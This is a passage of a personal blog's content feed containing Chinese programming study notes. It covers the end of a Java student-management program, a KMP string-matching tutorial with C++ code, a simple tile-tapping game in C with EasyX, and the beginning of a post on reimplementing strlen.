<span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_score,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(List l:score) &#123;</span><br><span class="line">            raf_score.write((l.get(<span class="number">0</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_score.write((l.get(<span class="number">1</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_score.write((l.get(<span class="number">2</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">        &#125;</span><br><span class="line">        raf_score.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//更新课程数据</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">updateAccountData</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        clearFile(data_account);</span><br><span class="line">        <span class="type">RandomAccessFile</span> <span class="variable">raf_account</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(data_account,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        raf_account.writeBytes(manager_id+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        raf_account.writeBytes(teacher_id+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        raf_account.writeBytes(student_id+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(String key:account.keySet()) &#123;</span><br><span class="line">            raf_account.write((key+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_account.write((account.get(key).get(<span class="number">0</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_account.write((account.get(key).get(<span class="number">1</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_account.write((account.get(key).get(<span class="number">2</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">            raf_account.write((account.get(key).get(<span class="number">3</span>)+<span class="string">&quot;\n&quot;</span>).getBytes());</span><br><span class="line">        &#125;</span><br><span class="line">        raf_account.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 文件内容更新</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updataAll</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        updateCourseData();</span><br><span class="line">        updateScoreData();</span><br><span class="line">        updateAccountData();</span><br><span class="line">        System.out.println(<span class="string">&quot;update finish&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ScoreCellRenderer</span> <span class="keyword">extends</span> <span class="title class_">DefaultListCellRenderer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getListCellRendererComponent</span><span class="params">(JList list, Object value, <span class="type">int</span> index, <span class="type">boolean</span> isSelected, <span class="type">boolean</span> cellHasFocus)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);</span><br><span class="line">        List&lt;Integer&gt; ci = (List&lt;Integer&gt;) value;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setText(<span class="string">&quot;学生编号: &quot;</span>+ci.get(<span class="number">0</span>)+<span class="string">&quot;   分数: &quot;</span>+ci.get(<span class="number">2</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CourseTeaCellRenderer</span> <span class="keyword">extends</span> <span class="title class_">DefaultListCellRenderer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getListCellRendererComponent</span><span class="params">(JList list, Object value, <span class="type">int</span> index, <span class="type">boolean</span> isSelected, <span class="type">boolean</span> cellHasFocus)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">ci</span> <span class="operator">=</span> (Integer) value;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">this</span>.setText(<span class="string">&quot;课程编号: &quot;</span>+ci);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CourseSelCellRenderer</span> <span class="keyword">extends</span> <span class="title class_">DefaultListCellRenderer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getListCellRendererComponent</span><span class="params">(JList list, Object value, <span class="type">int</span> index, <span class="type">boolean</span> isSelected, <span class="type">boolean</span> cellHasFocus)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);</span><br><span class="line">        Entry&lt;Integer, List&gt; ci = (Entry&lt;Integer, List&gt;) value;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setText(<span class="string">&quot;课程编号: &quot;</span>+ci.getKey()+<span class="string">&quot;   课程名称: &quot;</span>+ci.getValue().get(<span class="number">0</span>)+<span class="string">&quot;   教师编号: &quot;</span>+ci.getValue().get(<span class="number">1</span>)+<span class="string">&quot;   课程信息: &quot;</span>+ci.getValue().get(<span class="number">2</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CourseDelCellRenderer</span> <span class="keyword">extends</span> <span class="title class_">DefaultListCellRenderer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getListCellRendererComponent</span><span class="params">(JList list, Object value, <span class="type">int</span> index, <span class="type">boolean</span> isSelected, <span class="type">boolean</span> cellHasFocus)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);</span><br><span class="line">        <span class="type">List</span> <span class="variable">ci</span> <span class="operator">=</span> (List) value;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setText(<span class="string">&quot;课程编号: &quot;</span>+ci.get(<span class="number">1</span>)+<span class="string">&quot;   分数: &quot;</span>+ci.get(<span class="number">2</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TeaCellRenderer</span> <span class="keyword">extends</span> <span class="title class_">DefaultListCellRenderer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getListCellRendererComponent</span><span class="params">(JList list, Object value, <span class="type">int</span> index, <span class="type">boolean</span> isSelected, <span class="type">boolean</span> cellHasFocus)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.getListCellRendererComponent(list, value, index, isSelected, cellHasFocus);</span><br><span class="line">        Entry&lt;Integer, String&gt; ci = (Entry&lt;Integer, String&gt;) value;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setText(<span class="string">&quot;编号: &quot;</span>+ci.getKey()+<span class="string">&quot;    姓名: &quot;</span>+ci.getValue());</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KMP算法</title>
      <link href="/2023/04/08/KMP%E7%AE%97%E6%B3%95/"/>
      <url>/2023/04/08/KMP%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="KMP-——-一种字符串匹配算法-学习自董晓算法"><a href="#KMP-——-一种字符串匹配算法-学习自董晓算法" class="headerlink" title="KMP —— 一种字符串匹配算法(学习自董晓算法)"></a>KMP —— 一种字符串匹配算法(学习自董晓算法)</h1><p>给定一个模式串P和一个主串S，求模式串P在主串S中出现的位置。（字符串下标均从1开始）</p><ol><li>去<em>最长的</em>想等前后缀，可以保证不漏解</li><li>通过模式串前后缀的自我匹配长度，计算<em>next函数</em>（降低事件复杂度的关键），给j指针打一张表，失配时跳到next[j]的位置继续匹配。</li></ol><p><em>next函数</em><br>next[i]表示模式串P[1,i]中相等前后缀的最长长度</p><p><img src="https://s2.loli.net/2023/04/09/GrWayKlLNJei2bz.png" alt="image.png"></p><h2 id="next数组代码"><a href="#next数组代码" class="headerlink" title="next数组代码"></a>next数组代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">ne[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>,j = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line"><span class="keyword">while</span> (j &amp;&amp; p[i] != p[j + <span class="number">1</span>])</span><br><span class="line">j = ne[j];</span><br><span class="line"><span class="keyword">if</span> (p[i] == p[j + <span class="number">1</span>])</span><br><span class="line">j++;</span><br><span class="line">ne[i] = j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>双指针</em>： i扫描模式串, j扫描前缀。<br>初始化，ne[1]&#x3D;0,i&#x3D;2,j&#x3D;0.(固定的)<br>每轮for循环，i向右走一步。</p><ol><li>若p[i]!&#x3D;p[j+1],让j回跳到能匹配的位置，如果找不到能匹配的位置，j跳回0.</li><li>若p[i]&#x3D;&#x3D;p[j+1],让j+1，指向匹配前缀的末尾。</li><li>next[i]&#x3D;j.</li><li>j指针所走的总步数就决定乐总的执行次数，每轮for，j至多+1，那么j一共向右至多走n步，往左挑的部署加起来不超过n步，否则j变为负数，故j的总步数不会超过2n。例 a–ab.所以时间复杂度O(n)</li></ol><p><img src="https://s2.loli.net/2023/04/09/fmOwFJPICvQtaZh.png" alt="image.png"></p><h2 id="模式串与主串匹配代码"><a href="#模式串与主串匹配代码" class="headerlink" title="模式串与主串匹配代码"></a>模式串与主串匹配代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= m; i++) &#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; S[i] != P[j+<span class="number">1</span>]) </span><br><span class="line">        j = ne[j];</span><br><span class="line">        <span class="keyword">if</span>(S[i] == P[j+<span class="number">1</span>]) </span><br><span class="line">        j ++;</span><br><span class="line">        <span class="keyword">if</span>(j == n) </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i-n+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>双指针: i扫描主串，j扫描模式串。<br>初始化，i&#x3D;1，j&#x3D;0.<br>每轮for，i向右走一步。</p><ol><li>若s[i]!&#x3D;p[j+1],让j回跳到能匹配的位置，如果找不到能匹配的位置，j回跳到0.</li><li>若s[i]&#x3D;&#x3D;p[j+1],让j向右走一步。</li><li>若匹配成功，输出匹配位置。</li><li>时间复杂度同样是O(n)</li></ol><p><img src="https://s2.loli.net/2023/04/09/Lfxs64gRqjUoJdX.png" alt="image.png"></p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> m, n;</span><br><span class="line"><span class="type">char</span> S[N], P[N];</span><br><span class="line"><span class="type">int</span> ne[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; S+<span class="number">1</span> &gt;&gt; P+<span class="number">1</span>;</span><br><span class="line">    m = <span class="built_in">strlen</span>(S+<span class="number">1</span>), n = <span class="built_in">strlen</span>(P+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 计算next函数</span></span><br><span class="line">    <span class="built_in">puts</span>(S);</span><br><span class="line">    <span class="built_in">puts</span>(P); </span><br><span class="line">    <span class="comment">//printf(&quot;%d %d&quot;,m ,n);</span></span><br><span class="line">    ne[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= n; i ++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; P[i] != P[j+<span class="number">1</span>]) j = ne[j];</span><br><span class="line">        <span class="keyword">if</span>(P[i] == P[j+<span class="number">1</span>]) j ++; </span><br><span class="line">        ne[i] = j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// KMP匹配</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= m; i ++)&#123;</span><br><span class="line">        <span class="keyword">while</span>(j &amp;&amp; S[i] != P[j+<span class="number">1</span>]) j = ne[j];</span><br><span class="line">        <span class="keyword">if</span>(S[i] == P[j+<span class="number">1</span>]) j ++;</span><br><span class="line">        <span class="keyword">if</span>(j == n) <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i-n+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, ne[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>别踩白块儿</title>
      <link href="/2023/04/05/%E5%88%AB%E8%B8%A9%E7%99%BD%E5%9D%97%E5%84%BF/"/>
      <url>/2023/04/05/%E5%88%AB%E8%B8%A9%E7%99%BD%E5%9D%97%E5%84%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="鼠标判断不正常-待填的坑"><a href="#鼠标判断不正常-待填的坑" class="headerlink" title="鼠标判断不正常(待填的坑)"></a>鼠标判断不正常(待填的坑)</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;easyx.h&gt;</span>  <span class="comment">//图形库，绘制图形，输出文字</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 别踩白块：c+easyx</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERVAL 100 <span class="comment">//标题高度</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GRID_W 100 <span class="comment">//块的宽度</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GRID_H 150 <span class="comment">//块的高度</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义数组，存储黑块</span></span><br><span class="line"><span class="type">int</span> flags[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//统计成功点了多少个黑块</span></span><br><span class="line"><span class="type">int</span> gCount = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//设置随机数种子</span></span><br><span class="line"><span class="built_in">srand</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line"><span class="comment">//随机生成黑块</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flags[i] = <span class="built_in">rand</span>() % <span class="number">4</span>;<span class="comment">//0,1,2,3</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">draw</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* title = <span class="string">&quot;别踩白块儿&quot;</span>;</span><br><span class="line"><span class="built_in">setlinestyle</span>(PS_SOLID, <span class="number">2</span>);</span><br><span class="line"><span class="comment">//线条的颜色，默认是白色</span></span><br><span class="line"><span class="built_in">setlinecolor</span>(BLACK);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//画横线</span></span><br><span class="line"><span class="built_in">line</span>(<span class="number">0</span>, i * <span class="number">150</span> + INTERVAL, <span class="number">400</span>, i * <span class="number">150</span> + INTERVAL);</span><br><span class="line"><span class="comment">//画竖线</span></span><br><span class="line"><span class="built_in">line</span>(<span class="number">100</span> * i, INTERVAL, i * <span class="number">100</span>, <span class="number">700</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置文字颜色,样式</span></span><br><span class="line"><span class="built_in">settextcolor</span>(BLACK);</span><br><span class="line"><span class="built_in">settextstyle</span>(<span class="number">38</span>, <span class="number">0</span>, <span class="string">&quot;Arial&quot;</span>);</span><br><span class="line"><span class="comment">//输出标题(居中)</span></span><br><span class="line"><span class="type">int</span> spaceW = (<span class="built_in">getwidth</span>() - <span class="built_in">textwidth</span>(title)) / <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> spaceH = (INTERVAL - <span class="built_in">textheight</span>(title)) / <span class="number">2</span>;</span><br><span class="line"><span class="built_in">outtextxy</span>(spaceW, spaceH, title);</span><br><span class="line"></span><br><span class="line"><span class="comment">//绘制黑块</span></span><br><span class="line"><span class="built_in">setfillcolor</span>(BLACK);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//求出黑块的左上角坐标;</span></span><br><span class="line"><span class="type">int</span> x = flags[i] * GRID_W;</span><br><span class="line"><span class="type">int</span> y = i * GRID_H + INTERVAL;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">setfillcolor</span>(<span class="built_in">RGB</span>(<span class="number">156</span>, <span class="number">156</span>, <span class="number">156</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//绘制一个矩形</span></span><br><span class="line"><span class="built_in">fillrectangle</span>(x, y, x + GRID_W, y + GRID_H);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出分数</span></span><br><span class="line"><span class="built_in">settextstyle</span>(<span class="number">26</span>, <span class="number">0</span>, <span class="string">&quot;微软雅黑&quot;</span>);</span><br><span class="line"><span class="type">char</span> score[<span class="number">30</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">sprintf_s</span>(score,<span class="string">&quot;Score:%d&quot;</span>, gCount);</span><br><span class="line"></span><br><span class="line"><span class="built_in">outtextxy</span>(<span class="number">20</span>, <span class="number">40</span>, score);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理鼠标点击</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">mousePressMsg</span><span class="params">(ExMessage* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//获取下标为2的黑块的坐标</span></span><br><span class="line"><span class="type">int</span> x = flags[<span class="number">2</span>]*GRID_W;</span><br><span class="line"><span class="type">int</span> y = <span class="number">2</span> * GRID_H + INTERVAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是不是点击的下标为2的黑块</span></span><br><span class="line"><span class="keyword">if</span> (msg-&gt;x &gt; x &amp;&amp; x &lt; x + GRID_W  &amp;&amp; msg-&gt;y &gt; y &amp;&amp; msg-&gt;y &lt; y + GRID_H)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//黑块从上往下移动</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">3</span>; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">flags[i] = flags[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">flags[<span class="number">0</span>] = <span class="built_in">rand</span>() % <span class="number">4</span>;<span class="comment">//随机生成</span></span><br><span class="line">gCount++;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;你点击了正确的黑块\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;%s&quot;, __FUNCTION__); /* 输出是什么函数 */</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gameOverHit</span><span class="params">(<span class="type">int</span> w, <span class="type">int</span> h)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">setlinecolor</span>(GREEN);</span><br><span class="line"><span class="built_in">setfillcolor</span>(<span class="built_in">RGB</span>(<span class="number">93</span>, <span class="number">107</span>, <span class="number">153</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//画一个矩形</span></span><br><span class="line"><span class="type">int</span> spaceH = (<span class="built_in">getwidth</span>() - w) / <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> spaceV = (<span class="built_in">getwidth</span>() - h) / <span class="number">2</span>;</span><br><span class="line"><span class="built_in">fillrectangle</span>(spaceH, spaceV, spaceH + w, spaceV + h);</span><br><span class="line"><span class="type">int</span> mid_w = (spaceH + w) / <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> mid_h = (<span class="number">2</span>*spaceV+h) / <span class="number">2</span>;</span><br><span class="line"><span class="built_in">outtextxy</span>(mid_w, mid_h, <span class="string">&quot;lyx is sb&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1.黑窗口，来个图形窗口</span></span><br><span class="line"><span class="built_in">initgraph</span>(<span class="number">400</span>, <span class="number">700</span>, EX_SHOWCONSOLE);</span><br><span class="line"><span class="comment">//设置背景颜色</span></span><br><span class="line"><span class="built_in">setbkcolor</span>(WHITE);</span><br><span class="line"><span class="built_in">cleardevice</span>();</span><br><span class="line"><span class="built_in">setbkmode</span>(TRANSPARENT);</span><br><span class="line"><span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">draw</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//游戏主循环</span></span><br><span class="line"><span class="type">bool</span> isDone = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">while</span> (!isDone)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//消息(鼠标)处理</span></span><br><span class="line">ExMessage msg = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">peekmessage</span>(&amp;msg))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//按ESC退出游戏</span></span><br><span class="line"><span class="keyword">switch</span> (msg.message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line"><span class="keyword">if</span> (msg.vkcode == VK_ESCAPE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;quit\n&quot;</span>);</span><br><span class="line">isDone = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">mousePressMsg</span>(&amp;msg))</span><br><span class="line">&#123;</span><br><span class="line">isDone = <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//绘制</span></span><br><span class="line"><span class="built_in">BeginBatchDraw</span>();<span class="comment">//清除缓存</span></span><br><span class="line"><span class="built_in">cleardevice</span>();<span class="comment">//清屏</span></span><br><span class="line"><span class="built_in">draw</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">EndBatchDraw</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">gameOverHit</span>(<span class="number">200</span>,<span class="number">150</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//设置线条的样式</span></span><br><span class="line"><span class="comment">setlinestyle(PS_SOLID, 3);</span></span><br><span class="line"><span class="comment">//设置线条yanse</span></span><br><span class="line"><span class="comment">setlinecolor(RED);</span></span><br><span class="line"><span class="comment">//绘制线条</span></span><br><span class="line"><span class="comment">line(0, 0, 640, 480);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//设置填充颜色</span></span><br><span class="line"><span class="comment">setfillcolor(GREEN);</span></span><br><span class="line"><span class="comment">//绘制矩形</span></span><br><span class="line"><span class="comment">rectangle(50, 50, 50 + 250, 50 + 50);</span></span><br><span class="line"><span class="comment">fillrectangle(50, 160, 50 + 250, 60 + 50);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字符串函数模拟实现</title>
      <link href="/2023/04/02/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/"/>
      <url>/2023/04/02/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="size-t-strlen-const-char-str-求字符串长度"><a href="#size-t-strlen-const-char-str-求字符串长度" class="headerlink" title="size_t strlen(const char* str)求字符串长度"></a>size_t strlen(const char* str)求字符串长度</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="comment">//1.计数器版本</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_strlen</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">assert(str != <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">while</span> (*str != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">count++;</span><br><span class="line">str++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arr[] = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="type">int</span> len = my_strlen(arr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, len);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span 